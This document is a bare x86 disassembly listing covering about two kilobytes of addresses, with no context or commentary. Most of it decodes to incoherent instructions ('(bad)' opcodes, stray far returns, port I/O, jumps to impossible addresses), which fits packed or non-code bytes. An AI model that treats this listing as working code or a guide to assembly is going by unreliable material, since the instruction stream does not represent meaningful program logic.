  4305e4:	add    BYTE PTR [ebp+0x0],al
  4305e7:	mov    ecx,DWORD PTR [ebp-0x24]
  4305ea:	mov    ecx,ebx
  4305ec:	clc    
  4305ed:	jne    0x4305ba
  4305ef:	mov    esi,0xd672d3
  4305f4:	into   
  4305f5:	into   
  4305f6:	scas   eax,DWORD PTR es:[edi]
  4305f7:	dec    ebp
  4305f8:	mov    ecx,DWORD PTR [ebx-0x3482233c]
  4305fe:	sub    ecx,esi
  430600:	cmp    ecx,DWORD PTR [ebp+0x77]
  430603:	(bad)  
  430604:	mov    edi,eax
  430606:	mov    al,0x85
  430608:	mov    eax,edi
  43060a:	add    BYTE PTR [ebp-0x75],al
  43060d:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  430614:	xor    eax,DWORD PTR [ebp+0x4503f803]
  43061a:	(bad)  
  43061c:	retf   0x559c
  43061f:	(bad)  
  430620:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  430627:	inc    ebp
  430628:	add    eax,0xeb9c4d3f
  43062d:	(bad)  
  43062e:	mov    ecx,eax
  430630:	lods   al,BYTE PTR ds:[esi]
  430631:	test   DWORD PTR [ebp-0x8],edx
  430634:	xor    ecx,DWORD PTR [ebp+0x33]
  430637:	mov    eax,DWORD PTR [ebx]
  430639:	lock add ecx,ebx
  43063c:	bswap  esi
  43063e:	retf   0x55d1
  430641:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  430647:	jmp    0x430642
  430649:	add    BYTE PTR ds:0xebc44d8b,al
  43064f:	push   ebp
  430650:	mov    ebp,DWORD PTR [ebx]
  430652:	test   al,0x8b
  430654:	push   ebp
  430655:	clc    
  430656:	xor    ecx,ebx
  430658:	xor    ecx,esi
  43065a:	add    edx,ecx
  43065c:	add    eax,DWORD PTR [edx+0xca010f]
  430662:	push   ebp
  430663:	dec    ebp
  430664:	mov    ecx,DWORD PTR [ebx-0x34050710]
  43066a:	stc    
  43066b:	rol    DWORD PTR ds:0xebce4dd6,cl
  430671:	scas   eax,DWORD PTR es:[edi]
  430672:	mov    ecx,DWORD PTR [ebx+0x7d55c4c8]
  430678:	xor    ebp,DWORD PTR [ebx]
  43067a:	xor    edi,DWORD PTR [ebx]
  43067c:	add    esi,DWORD PTR [edi+0x3]
  43067f:	mov    ecx,DWORD PTR [edi]
  430681:	clc    
  430682:	retf   0x55cb
  430685:	into   
  430686:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  43068d:	mov    eax,0x3376554d
  430692:	mov    esi,DWORD PTR [ebx]
  430694:	enter  0x5503,0x3
  430698:	xor    ecx,DWORD PTR [edi]
  43069a:	xor    ecx,edx
  43069c:	add    edx,DWORD PTR [ebp+0x3]
  43069f:	mov    ecx,DWORD PTR [edi]
  4306a1:	lock retf 0x4dfa
  4306a5:	stc    
  4306a6:	mov    ecx,DWORD PTR [eax]
  4306a8:	or     BYTE PTR [ebp+0x4d],cl
  4306ab:	jmp    0x107073b
  4306b0:	dec    ebp
  4306b1:	dec    ebp
  4306b2:	(bad)  
  4306b3:	mov    esp,esp
  4306b5:	clc    
  4306b6:	test   ebx,ecx
  4306b8:	clc    
  4306b9:	ror    DWORD PTR [ebp-0x2a],cl
  4306bc:	mov    esi,ecx
  4306be:	in     al,dx
  4306bf:	scas   eax,DWORD PTR es:[edi]
  4306c0:	inc    ebp
  4306c1:	mov    esi,DWORD PTR [ebx]
  4306c3:	les    ebx,FWORD PTR [ebp+edi*2+0x3be42b8b]
  4306ca:	retf   
  4306cb:	ja     0x43069b
  4306cd:	mov    ebp,DWORD PTR [eax-0x48]
  4306d0:	dec    ebp
  4306d1:	xor    ecx,DWORD PTR [di+0x3]
  4306d5:	mov    ebp,eax
  4306d7:	clc    
  4306d8:	push   ebp
  4306d9:	retf   
  4306da:	mov    dl,bl
  4306dc:	adc    esi,edx
  4306de:	jb     0x4306ae
  4306e0:	add    BYTE PTR [edi-0x3b7474b3],ch
  4306e6:	in     al,dx
  4306e7:	jge    0x4306b4
  4306e9:	sub    ecx,DWORD PTR [ebp+0x3b]
  4306ec:	mov    esi,DWORD PTR [edi-0x24]
  4306ef:	mov    ecx,DWORD PTR [esp+eiz*4+0x4d32459b]
  4306f6:	mov    BYTE PTR [ebx-0x34b20729],cl
  4306fc:	mov    edx,ebx
  4306fe:	in     al,dx
  4306ff:	(bad)  
  430700:	ror    esi,cl
  430702:	push   ebp
  430703:	scas   eax,DWORD PTR es:[edi]
  430704:	mov    ecx,DWORD PTR [ebx+0x7d8cc4dc]
  43070a:	fwait
  43070b:	sub    esi,DWORD PTR [edx]
  43070d:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430713:	lods   al,BYTE PTR ds:[esi]
  430714:	xor    esp,DWORD PTR [ebx]
  430716:	add    ecx,DWORD PTR [ebp-0x18]
  430719:	mov    edi,DWORD PTR [ebp-0x8]
  43071c:	mov    bl,cl
  43071e:	cmp    dl,bl
  430720:	jb     0x4306f0
  430722:	add    dh,dl
  430724:	dec    ebp
  430725:	scas   eax,DWORD PTR es:[edi]
  430726:	mov    ecx,DWORD PTR [ebx+0x7dcbc4ec]
  43072c:	shr    DWORD PTR [ebx],cl
  43072e:	into   
  43072f:	cmp    edx,esi
  430731:	mov    ebp,DWORD PTR [edi-0x17fcfc58]
  430737:	dec    ebp
  430738:	dec    ebp
  430739:	mov    ecx,DWORD PTR [ebx+0x55d3ecf8]
  43073f:	retf   
  430740:	xor    edx,esi
  430742:	add    ecx,esi
  430744:	imul   ecx,edx
  430747:	mov    DWORD PTR [ebp+0x8],edx
  43074a:	xor    ecx,DWORD PTR [ebp+0x2b]
  43074d:	mov    DWORD PTR [ebx+0x7d4dece0],ecx
  430753:	add    esi,DWORD PTR [ebx]
  430755:	mov    ah,0x3
  430757:	inc    ebp
  430758:	rdtsc  
  43075a:	xlat   BYTE PTR ds:[ebx]
  43075b:	pushf  
  43075c:	jge    0x4306e7
  43075e:	xor    ebx,esp
  430760:	sub    eax,DWORD PTR [ebp-0x73]
  430763:	(bad)  
  430764:	cmp    al,al
  430766:	jb     0x4306ed
  430768:	add    al,bh
  43076a:	ror    DWORD PTR [ebp-0x7a],1
  43076d:	xor    edi,edi
  43076f:	add    edi,edi
  430771:	jmp    0x4307c0
  430773:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430779:	dec    ebp
  43077a:	into   
  43077b:	mov    ebp,DWORD PTR [edi-0x1b737424]
  430781:	fwait
  430782:	shl    DWORD PTR [edx],cl
  430784:	retf   0x5588
  430787:	or     ecx,DWORD PTR [ebp+0x7233114d]
  43078d:	add    eax,DWORD PTR [eax]
  43078f:	call   0x8ace5ce1
  430794:	fcom   DWORD PTR [ecx]
  430796:	retf   
  430797:	jb     0x4307fe
  430799:	add    ch,cl
  43079b:	dec    ebp
  43079c:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  4307a2:	dec    ebp
  4307a3:	xor    ecx,DWORD PTR [ebx-0x34173bfd]
  4307a9:	jge    0x430779
  4307ab:	mov    BYTE PTR [edi+0xf723b3a],ch
  4307b1:	add    cl,dh
  4307b3:	dec    ebp
  4307b4:	dec    DWORD PTR [ebx-0x2c031b75]
  4307ba:	adc    BYTE PTR [ebp+0x1],0x8b
  4307be:	add    ah,bl
  4307c0:	jge    0x43074e
  4307c2:	push   0xffffff9b
  4307c4:	push   0x8b3032
  4307c9:	shl    BYTE PTR [ebp+0x55],0x6a
  4307cd:	xor    edi,edi
  4307cf:	xor    edx,DWORD PTR [ebx+eax*1]
  4307d2:	inc    ebp
  4307d3:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4307d9:	dec    ebp
  4307da:	or     BYTE PTR [ecx+0x4dcce883],cl
  4307e0:	jbe    0x43076d
  4307e2:	mov    esp,eax
  4307e4:	ror    bl,1
  4307e6:	enter  0x14ce,0xaf
  4307ea:	dec    DWORD PTR [ebx-0x2cef13f8]
  4307f0:	push   ebp
  4307f1:	retf   0x5540
  4307f4:	push   ebp
  4307f5:	mov    esi,DWORD PTR [edx-0x18]
  4307f8:	mov    edx,ebx
  4307fa:	cld    
  4307fb:	(bad)  
  4307fc:	sub    BYTE PTR [edi-0x1bff74ff],0x0
  430803:	sti    
  430804:	add    dh,cl
  430806:	push   0xffffff94
  430808:	call   FWORD PTR [ebx+0x3b5032d0]
  43080e:	mov    ecx,DWORD PTR [edi]
  430810:	enter  0x455e,0xff
  430814:	mov    DWORD PTR [ebx+0x5545eccc],ecx
  43081a:	xor    esi,DWORD PTR [ebx]
  43081c:	mov    DWORD PTR [ebx],0xcace0f9c
  430822:	aas    
  430823:	push   ebp
  430824:	inc    ebp
  430825:	xor    edx,esi
  430827:	add    edx,esi
  430829:	mov    eax,DWORD PTR [ebx]
  43082b:	(bad)  
  43082c:	jmp    0x4307ba
  43082e:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  430834:	rol    ah,1
  430836:	mov    esi,0xf133104d
  43083b:	mov    edx,0xff388d80
  430840:	mov    dh,0xd1
  430842:	cmp    edx,DWORD PTR [ebp+0xf]
  430845:	mov    eax,DWORD PTR [edx-0x28]
  430848:	add    BYTE PTR [ebp-0x75],bh
  43084b:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  430852:	fwait
  430853:	retf   0x8632
  430856:	cmp    ebp,0x8
  430859:	call   ebx
  43085b:	inc    ebp
  43085c:	inc    ebp
  43085d:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  430863:	mov    esi,DWORD PTR [ecx]
  430865:	int3   
  430866:	pushf  
  430867:	add    al,0xc7
  430869:	add    al,al
  43086b:	add    bl,al
  43086d:	(bad)  
  43086e:	clc    
  43086f:	int3   
  430870:	inc    ebp
  430871:	add    BYTE PTR [ecx],dh
  430873:	push   eax
  430874:	pushf  
  430875:	mov    edi,eax
  430877:	enter  0xc008,0x85
  43087b:	aas    
  43087c:	clc    
  43087d:	gs inc ebp
  43087f:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  430885:	push   ss
  430886:	xor    ecx,DWORD PTR [ebp+0x3]
  430889:	sub    edx,DWORD PTR [ecx-0x76]
  43088c:	dec    ebp
  43088d:	add    DWORD PTR [ebx+0x88d845],ecx
  430893:	mov    esi,DWORD PTR [ebx]
  430895:	or     BYTE PTR [ebx],al
  430897:	cmp    edx,DWORD PTR [ecx-0x34]
  43089a:	dec    ebp
  43089b:	out    dx,eax
  43089c:	xor    eax,DWORD PTR [ebp+0x3]
  43089f:	mov    edx,DWORD PTR [ecx-0x28]
  4308a2:	dec    ebp
  4308a3:	add    BYTE PTR [ebx],dh
  4308a5:	push   0x518003
  4308aa:	push   eax
  4308ab:	add    BYTE PTR [ebx-0x300748b],cl
  4308b1:	sbb    BYTE PTR [ebp+0x45],cl
  4308b4:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  4308ba:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4308c0:	dec    ebp
  4308c1:	inc    ebp
  4308c2:	xor    edx,esi
  4308c4:	add    edx,esi
  4308c6:	push   ecx
  4308c7:	(bad)  
  4308c8:	dec    ebp
  4308c9:	mov    al,ds:0xc5d83dff
  4308ce:	retf   
  4308cf:	(bad)  
  4308d0:	into   
  4308d1:	sub    bh,bh
  4308d3:	dec    esp
  4308d4:	adc    al,0x9c
  4308d6:	inc    ebp
  4308d7:	push   ebp
  4308d8:	test   DWORD PTR [edi],ecx
  4308da:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  4308e1:	jmp    0xc9bc17f5
  4308e6:	add    cl,dl
  4308e8:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4308f2:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4308f8:	rol    BYTE PTR [eax],0x54
  4308fb:	clc    
  4308fc:	gs jb  0x430906
  4308ff:	mov    eax,DWORD PTR [ebp-0x30]
  430902:	xor    al,0x40
  430904:	sub    al,0xc7
  430906:	mov    al,ah
  430908:	add    DWORD PTR [ebp+0x4534f845],eax
  43090e:	sub    al,0x80
  430910:	mov    BYTE PTR [edx+eax*1-0x375a39],bl
  430917:	mov    ch,0xff
  430919:	clc    
  43091a:	add    DWORD PTR [ebp+0x60],0x3d
  43091e:	call   FWORD PTR [eax+eax*1-0x277a77]
  430925:	inc    ebp
  430926:	dec    DWORD PTR [ebx-0x3427f701]
  43092c:	test   esi,ecx
  43092e:	dec    DWORD PTR [ebx-0x7f8a3701]
  430934:	push   eax
  430935:	add    DWORD PTR [ebp+0x0],eax
  430938:	dec    ebx
  43093a:	or     al,0xce
  43093c:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  430943:	into   
  430944:	add    BYTE PTR [ebx-0x34ff2000],cl
  43094a:	mov    esi,ecx
  43094c:	sar    bh,0x45
  43094f:	adc    al,0x8b
  430951:	clc    
  430952:	fadd   DWORD PTR [ebp+0x0]
  430955:	mov    ebp,DWORD PTR [edx+0x8]
  430958:	push   edi
  430959:	adc    BYTE PTR [eax+0x1],0x83
  43095d:	add    al,al
  43095f:	retf   
  430960:	mov    ecx,esi
  430962:	cld    
  430963:	mov    eax,DWORD PTR [eax+0xcb01c8]
  430969:	into   
  43096a:	add    BYTE PTR [ebx+0x756ae000],cl
  430970:	jne    0x4309a5
  430972:	inc    DWORD PTR [ebx]
  430974:	rcl    BYTE PTR [ecx+0x50],1
  430977:	push   eax
  430978:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  43097e:	mov    eax,DWORD PTR [eax+ebx*8-0x14ffbafd]
  430985:	sar    bh,0x84
  430988:	or     BYTE PTR [ebx],al
  43098a:	push   eax
  43098b:	add    BYTE PTR [ebx+0x453ccc45],cl
  430991:	pushf  
  430992:	xor    edi,eax
  430994:	pushf  
  430995:	mov    ah,0x89
  430997:	test   esp,ebp
  430999:	clc    
  43099a:	inc    ebp
  43099b:	inc    ebp
  43099c:	mov    DWORD PTR [eax+eax*8],esi
  43099f:	sub    al,0x32
  4309a1:	mov    BYTE PTR [ebx+ecx*4+0x54dce089],bl
  4309a8:	dec    ebp
  4309a9:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309ad:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  4309b3:	xor    eax,DWORD PTR gs:[edi+0x3]
  4309b7:	or     DWORD PTR [ecx+0x45ff085c],0x0
  4309be:	shl    DWORD PTR [ebp-0x380064],1
  4309c4:	enter  0x858d,0x60
  4309c8:	clc    
  4309c9:	inc    DWORD PTR [ebp+0x50]
  4309cc:	cmp    al,0x75
  4309ce:	pushf  
  4309cf:	(bad)  
  4309d0:	(bad)  
  4309d1:	pop    esp
  4309d2:	lods   al,BYTE PTR ds:[esi]
  4309d3:	inc    DWORD PTR [ebp+0x4508f8ff]
  4309d9:	mov    edi,DWORD PTR [esi]
  4309db:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  4309e2:	test   DWORD PTR [edi-0x8],edx
  4309e5:	sbb    al,0x45
  4309e7:	add    BYTE PTR [eax],bh
  4309e9:	push   0x8b809c
  4309ee:	loopne 0x430a35
  4309f0:	push   ebp
  4309f1:	mov    esi,DWORD PTR [ebx]
  4309f3:	cld    
  4309f4:	add    eax,DWORD PTR [eax+0xf013b]
  4309fa:	adc    al,0x0
  4309fc:	add    bh,bh
  4309fe:	jmp    0xc00b1b
  430a03:	add    BYTE PTR [ebp+0x45],cl
  430a06:	mov    ecx,DWORD PTR [ebx+0xd1d8ec]
  430a0c:	dec    ebp
  430a0d:	push   0x38033
  430a12:	cmp    eax,DWORD PTR [eax]
  430a14:	unpcklps xmm7,xmm0
  430a17:	jne    0x430a19
  430a19:	dec    DWORD PTR [ebx+0x5545c818]
  430a1f:	mov    DWORD PTR [ebx],esi
  430a21:	shl    BYTE PTR [ebx],1
  430a23:	inc    ebp
  430a24:	add    ecx,DWORD PTR [ecx+0x60fcc03]
  430a2a:	retf   0x5575
  430a2d:	dec    DWORD PTR [ebx-0x5ba13e8]
  430a33:	(bad)  
  430a34:	stc    
  430a35:	loopne 0x430a43
  430a37:	test   DWORD PTR [ebp-0x8],ecx
  430a3a:	xor    eax,DWORD PTR [ebp+0x3]
  430a3d:	mov    ebp,ecx
  430a3f:	rol    BYTE PTR [eax],1
  430a41:	inc    ebp
  430a42:	add    BYTE PTR [eax-0x7747ab3],bh
  430a48:	clc    
  430a49:	inc    ebp
  430a4a:	retf   
  430a4b:	mov    edx,ebx
  430a4d:	loopne 0x430a25
  430a4f:	retf   
  430a50:	into   
  430a51:	into   
  430a52:	scas   eax,DWORD PTR es:[edi]
  430a53:	dec    ebp
  430a54:	mov    ecx,DWORD PTR [ebx-0x34821f0c]
  430a5a:	sub    ecx,esi
  430a5c:	cmp    ecx,DWORD PTR [ebp+0x77]
  430a5f:	(bad)  
  430a60:	mov    edi,eax
  430a62:	enter  0x8985,0xf8
  430a66:	add    BYTE PTR [ebp-0x75],al
  430a69:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  430a70:	xor    eax,DWORD PTR [ebp+0x4503f803]
  430a76:	(bad)  
  430a78:	retf   0x559c
  430a7b:	(bad)  
  430a7c:	mov    esp,DWORD PTR [esp+ebp*8-0x607057b]
  430a83:	inc    ebp
  430a84:	add    eax,0xeb9c4d3f
  430a89:	(bad)  
  430a8a:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  430a90:	xor    ecx,DWORD PTR [ebp+0x33]
  430a93:	mov    eax,DWORD PTR [ebx]
  430a95:	in     al,dx
  430a96:	add    ecx,ebx
  430a98:	bswap  esi
  430a9a:	retf   0x55d1
  430a9d:	test   BYTE PTR [ebx-0x5ff13fe],cl
  430aa3:	jmp    0x430a9e
  430aa5:	add    BYTE PTR ds:0xebf44d8b,al
  430aab:	push   ebp
  430aac:	mov    ebp,DWORD PTR [ebx]
  430aae:	mov    eax,0x33f8558b
  430ab3:	retf   
  430ab4:	xor    ecx,esi
  430ab6:	add    edx,ecx
  430ab8:	add    eax,DWORD PTR [edx+0xca010f]
  430abe:	push   ebp
  430abf:	dec    ebp
  430ac0:	mov    ecx,DWORD PTR [ebx-0x34050714]
  430ac6:	stc    
  430ac7:	rol    DWORD PTR ds:0xebce4dd6,cl
  430acd:	scas   eax,DWORD PTR es:[edi]
  430ace:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  430ad4:	xor    ebp,DWORD PTR [ebx]
  430ad6:	xor    edi,DWORD PTR [ebx]
  430ad8:	add    esi,DWORD PTR [edi+0x3]
  430adb:	mov    ecx,DWORD PTR [edi]
  430add:	clc    
  430ade:	retf   0x55cb
  430ae1:	into   
  430ae2:	mov    edi,DWORD PTR [esp+ebp*8-0x6740600]
  430ae9:	test   al,0x4d
  430aeb:	push   ebp
  430aec:	jbe    0x430b21
  430aee:	mov    esi,DWORD PTR [ebx]
  430af0:	mov    al,0x3
  430af2:	push   ebp
  430af3:	add    esi,DWORD PTR [ebx]
  430af5:	rdpmc  
  430af7:	retf   0x5503
  430afa:	add    ecx,DWORD PTR [ebx-0x53513f1]
  430b00:	dec    ebp
  430b01:	stc    
  430b02:	mov    ecx,DWORD PTR [eax]
  430b04:	or     BYTE PTR [ebp+0x4d],cl
  430b07:	jmp    0x1370b97
  430b0c:	dec    ebp
  430b0d:	dec    ebp
  430b0e:	(bad)  
  430b0f:	mov    esp,esp
  430b11:	clc    
  430b12:	test   ebx,ecx
  430b14:	clc    
  430b15:	ror    DWORD PTR [ebp-0x2a],cl
  430b18:	mov    esi,ecx
  430b1a:	lock scas eax,DWORD PTR es:[edi]
  430b1c:	inc    ebp
  430b1d:	mov    esi,DWORD PTR [ebx]
  430b1f:	hlt    
  430b20:	pushf  
  430b21:	jge    0x430aae
  430b23:	sub    esp,esp
  430b25:	cmp    ecx,ebx
  430b27:	ja     0x430af7
  430b29:	mov    ebp,DWORD PTR [eax-0x58]
  430b2c:	dec    ebp
  430b2d:	xor    ecx,DWORD PTR [di+0x3]
  430b31:	mov    ebp,eax
  430b33:	clc    
  430b34:	push   ebp
  430b35:	retf   
  430b36:	mov    dl,bl
  430b38:	adc    esi,edx
  430b3a:	jb     0x430b0a
  430b3c:	add    BYTE PTR [edi-0xb7474b3],ch
  430b42:	lock jge 0x430b10
  430b45:	sub    ecx,DWORD PTR [ebp+0x3b]
  430b48:	mov    esi,DWORD PTR [edi-0x28]
  430b4b:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  430b52:	mov    BYTE PTR [ebx-0x34b20729],cl
  430b58:	mov    edx,ebx
  430b5a:	lock (bad) 
  430b5c:	ror    esi,cl
  430b5e:	push   ebp
  430b5f:	scas   eax,DWORD PTR es:[edi]
  430b60:	mov    ecx,DWORD PTR [ebx+0x7d8cf4d8]
  430b66:	fwait
  430b67:	sub    esi,DWORD PTR [edx]
  430b69:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  430b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430b70:	xor    esp,DWORD PTR [ebx]
  430b72:	add    ecx,DWORD PTR [ebp-0x18]
  430b75:	mov    edi,DWORD PTR [ebp-0x8]
  430b78:	mov    bl,cl
  430b7a:	cmp    dl,bl
  430b7c:	jb     0x430b4c
  430b7e:	add    dh,dl
  430b80:	dec    ebp
  430b81:	scas   eax,DWORD PTR es:[edi]
  430b82:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  430b88:	shr    DWORD PTR [ebx],cl
  430b8a:	into   
  430b8b:	cmp    edx,esi
  430b8d:	mov    ebp,DWORD PTR [edi-0x17fcfc48]
  430b93:	dec    ebp
  430b94:	dec    ebp
  430b95:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  430b9b:	retf   
  430b9c:	xor    edx,esi
  430b9e:	add    ecx,esi
  430ba0:	imul   ecx,edx
  430ba3:	mov    DWORD PTR [ebp+0x8],edx
  430ba6:	xor    ecx,DWORD PTR [ebp+0x2b]
  430ba9:	mov    DWORD PTR [ebx+0x7d4df0e0],ecx
  430baf:	add    esi,DWORD PTR [ebx]
  430bb1:	rol    BYTE PTR [ebx],0x45
  430bb4:	rdtsc  
  430bb6:	xlat   BYTE PTR ds:[ebx]
  430bb7:	pushf  
  430bb8:	jge    0x430b43
  430bba:	xor    ebx,eax
  430bbc:	sub    eax,DWORD PTR [ebp-0x73]
  430bbf:	(bad)  
  430bc0:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  430bc7:	dec    ebp
  430bc8:	xchg   BYTE PTR [ebx],dh
  430bca:	inc    DWORD PTR [ebx]
  430bcc:	(bad)  
  430bcd:	jmp    0x430c1c
  430bcf:	mov    ecx,DWORD PTR [ebx-0x34341f1c]
  430bd5:	dec    ebp
  430bd6:	into   
  430bd7:	mov    ebp,DWORD PTR [edi-0x1b737428]
  430bdd:	fwait
  430bde:	shl    DWORD PTR [edx],cl
  430be0:	retf   0x5588
  430be3:	or     ecx,DWORD PTR [ebp+0x7233114d]
  430be9:	add    eax,DWORD PTR [eax]
  430beb:	call   0x8ace613d
  430bf0:	fcom   QWORD PTR [ecx]
  430bf2:	retf   
  430bf3:	jb     0x430c5a
  430bf5:	add    ch,cl
  430bf7:	dec    ebp
  430bf8:	sub    ecx,DWORD PTR [edx+0x55ec0b03]
  430bfe:	dec    ebp
  430bff:	xor    ecx,DWORD PTR [ebx-0x34170bfd]
  430c05:	jge    0x430bd5
  430c07:	mov    BYTE PTR [edi+0xf723b3a],ch
  430c0d:	add    cl,dh
  430c0f:	dec    ebp
  430c10:	dec    DWORD PTR [ebx-0x2c031b01]
  430c16:	inc    ebp
  430c17:	push   ebp
  430c18:	dec    DWORD PTR [ebx-0x73ff2734]
  430c1e:	lea    ebx,[ebx-0x7400cdac]
  430c24:	push   eax
  430c25:	mov    ah,0x45
  430c27:	push   ebp
  430c28:	mov    esi,DWORD PTR [ebx]
  430c2a:	les    esi,FWORD PTR [ebx]
  430c2c:	add    BYTE PTR [ebx],al
  430c2e:	inc    DWORD PTR [ebx]
  430c30:	mov    ecx,DWORD PTR [edi]
  430c32:	cld    
  430c33:	retf   0x4d80
  430c36:	add    DWORD PTR [ecx+0x4d30e800],ecx
  430c3c:	jne    0x430bc9
  430c3e:	jmp    eax
  430c40:	ror    bl,1
  430c42:	or     cl,dh
  430c44:	add    BYTE PTR [edi-0xf2f7475],ch
  430c4a:	not    bl
  430c4c:	adc    al,0xca
  430c4e:	inc    ebp
  430c4f:	push   ebp
  430c50:	mov    ecx,DWORD PTR [ebx-0x2cff1728]
  430c56:	push   0xaf80d6
  430c5b:	mov    eax,DWORD PTR [eax]
  430c5d:	in     al,0xff
  430c5f:	sti    
  430c60:	sbb    dh,cl
  430c62:	pop    esi
  430c63:	xchg   esp,eax
  430c64:	leave  
  430c65:	fwait
  430c66:	add    al,0x32
  430c68:	push   ebp
  430c69:	cmp    ebp,esp
  430c6b:	sqrtps xmm3,XMMWORD PTR [esi+0x4d]
  430c6f:	dec    DWORD PTR [ecx-0x740f0375]
  430c75:	push   ebp
  430c76:	cld    
  430c77:	xor    ebp,ebx
  430c79:	add    ecx,DWORD PTR [ebx-0x743576f1]
  430c7f:	push   ebp
  430c80:	clc    
  430c81:	xor    esi,ecx
  430c83:	add    esi,DWORD PTR [ebp-0x75]
  430c86:	(bad)  
  430c87:	hlt    
  430c88:	or     DWORD PTR [esi+eax*8-0x39cdf865],ecx
  430c8f:	mov    DWORD PTR [esi],eax
  430c91:	hlt    
  430c92:	(bad)  
  430c93:	dec    ebp
  430c94:	add    esi,DWORD PTR [ebx]
  430c96:	(bad)  
  430c97:	mov    edx,0xffc68d0a
  430c9c:	add    dl,cl
  430c9e:	leave  
  430c9f:	push   ebp
  430ca0:	push   ebp
  430ca1:	mov    ebp,esp
  430ca3:	fcom   QWORD PTR [ecx+0x7d]
  430ca6:	inc    ebp
  430ca7:	xor    ecx,DWORD PTR [ecx-0x74f003fd]
  430cad:	iret   
  430cae:	cld    
  430caf:	retf   0x868f
  430cb2:	loopne 0x430cb1
  430cb4:	mov    edi,edi
  430cb6:	mov    esi,DWORD PTR [ebp-0x8]
  430cb9:	mov    esi,eax
  430cbb:	cld    
  430cbc:	jne    0x430c6e
  430cbe:	mov    BYTE PTR [ecx],0xa
  430cc1:	add    dh,al
  430cc3:	test   DWORD PTR [eax],ecx
  430cc5:	inc    esi
  430cc7:	inc    DWORD PTR [edi]
  430cc9:	mov    eax,esi
  430ccb:	cld    
  430ccc:	add    DWORD PTR [eax+0x901c6],eax
  430cd2:	leave  
  430cd3:	xor    BYTE PTR [ebp+0x45],dl
  430cd6:	in     al,dx
  430cd7:	mov    edx,DWORD PTR [ecx-0x40]
  430cda:	inc    ebp
  430cdb:	add    BYTE PTR [ecx-0x74000301],cl
  430ce1:	int3   
  430ce2:	cld    
  430ce3:	jne    0x430c9d
  430ce5:	call   0xcc1ff0
  430cea:	mov    esi,DWORD PTR [ebp-0x8]
  430ced:	test   eax,esi
  430cef:	je     0x430d66
  430cf1:	mov    eax,esi
  430cf3:	cld    
  430cf4:	add    al,0x80
  430cf6:	add    WORD PTR [ecx+0x0],ax
  430cfa:	fiadd  DWORD PTR [eax]
  430cfc:	mov    BYTE PTR [eax],0x3d
  430cff:	push   0xffffffc3
  430d01:	push   esi
  430d02:	mov    edx,DWORD PTR [eax+0x51]
  430d05:	pop    edi
  430d06:	lea    ebx,[ebx-0x8]
  430d09:	ret    0x45
  430d0c:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430d12:	xchg   eax,edi
  430d14:	mov    DWORD PTR [ebp-0x75],ecx
  430d17:	push   esi
  430d18:	clc    
  430d19:	jne    0x430ceb
  430d1b:	mov    ecx,0xf8450b0b
  430d20:	(bad)  
  430d21:	push   cs
  430d22:	or     BYTE PTR [ebp-0x3a],dh
  430d25:	cmp    eax,DWORD PTR [ecx]
  430d27:	pop    esi
  430d28:	(bad)  
  430d29:	or     al,0x5
  430d2b:	inc    eax
  430d2c:	leave  
  430d2d:	jmp    0x40cf:0x25564204
  430d34:	leave  
  430d35:	in     eax,dx
  430d36:	inc    DWORD PTR [eax-0x75]
  430d39:	fimul  DWORD PTR [ebx-0x228139be]
  430d3f:	inc    eax
  430d40:	nop
  430d41:	loopne 0x430d42
  430d43:	ret    
  430d44:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430d4a:	add    eax,0xff45e8f8
  430d4f:	push   esi
  430d50:	push   DWORD PTR [ebp-0x39]
  430d53:	mov    eax,0x7edda46
  430d58:	or     al,0x6
  430d5a:	push   DWORD PTR [ebp-0x3a]
  430d5d:	cmp    eax,DWORD PTR [edx]
  430d5f:	pop    esi
  430d60:	ret    
  430d61:	or     al,0x56
  430d63:	inc    ecx
  430d64:	push   ebp
  430d65:	jle    0x430d53
  430d67:	inc    edx
  430d68:	inc    ebp
  430d69:	int    0x1
  430d6b:	inc    ecx
  430d6c:	sub    BYTE PTR ds:0xe77541fc,ah
  430d72:	add    DWORD PTR [edx+0x1c],eax
  430d75:	retf   0xc38b
  430d78:	adc    al,0x8b
  430d7a:	xchg   edx,eax
  430d7b:	push   ecx
  430d7c:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430d82:	rcl    DWORD PTR [esi-0x9],cl
  430d85:	jne    0x430dd7
  430d87:	mov    eax,0x7c80ece
  430d8c:	rol    DWORD PTR [esi],cl
  430d8e:	div    DWORD PTR [ebp+0x50]
  430d91:	cmp    ecx,edx
  430d93:	pop    esi
  430d94:	dec    BYTE PTR [edx]
  430d96:	in     al,dx
  430d97:	inc    edx
  430d98:	sub    esp,ecx
  430d9a:	inc    eax
  430d9b:	(bad)  
  430d9c:	push   eax
  430d9d:	add    edx,DWORD PTR [eax-0x1f]
  430da0:	push   edi
  430da1:	add    dh,dh
